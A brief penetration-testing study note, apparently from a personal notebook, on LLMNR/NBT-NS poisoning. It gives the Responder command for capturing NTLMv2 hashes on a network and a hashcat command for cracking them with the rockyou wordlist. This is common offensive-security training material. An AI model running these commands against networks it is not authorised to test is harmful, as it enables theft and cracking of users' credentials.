___
### What is LLMNR?
- Used to identify hosts when DNS fails to do so.
- Previously NBT-NS
- Key flaw is that the services utilize a user's username and NTLMv2 hash when appropriately responded to.

### Steps:

- Step1 : Run Responder
```
sudo responder -| tun0 -dwp
```

- Step 2 : An Event Occurs...
- Step 3 : Get Dem Hash
- Step 4 : Crack that Hash
```
hashcat -m 5600 hashes.txt rockyou.txt
```
